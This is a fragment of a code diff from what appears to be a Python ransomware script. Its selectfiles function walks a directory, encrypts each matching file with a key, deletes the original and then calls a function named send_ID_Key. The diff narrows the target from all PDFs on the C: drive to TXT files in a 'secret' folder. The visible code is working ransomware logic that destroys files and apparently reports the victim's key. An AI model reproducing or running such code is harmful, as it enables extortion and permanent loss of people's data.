@@ -88,9 +88,9 @@ def single_arg_encrypt_file(in_filename):
 
 def selectfiles():
     files_to_enc = []
-    for root, dirs, files in os.walk("C:\\"):
+    for root, dirs, files in os.walk("C:\\secret\\"):
         for file in files:
-            if file.endswith(".pdf"):
+            if file.endswith(".txt"):
                 encrypt_file(key,os.path.join(root, file))
                 os.remove(os.path.join(root,file))
     send_ID_Key()
